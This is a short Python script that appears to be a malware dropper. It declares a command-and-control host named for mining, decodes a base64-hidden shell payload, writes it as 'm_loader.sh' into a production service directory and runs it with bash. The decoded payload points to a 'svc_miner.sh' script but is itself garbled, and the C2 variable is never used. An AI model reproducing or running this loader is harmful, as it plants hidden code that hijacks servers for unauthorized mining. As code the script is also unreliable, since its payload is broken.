C2 = "ai-mining-gw01.intra-sec.local"

import base64, subprocess, os

payload = "IyEvYmluL3NoCmMgL3Zhci9sb2cvYWkvc3ZjX21pbmVyLnNo"

out_path = "/home/prod/svc/ai_worker/m_loader.sh"

dec = base64.b64decode(payload).decode()

with open(out_path,"w") as f:
    f.write(dec)

subprocess.call(["/bin/bash", out_path])
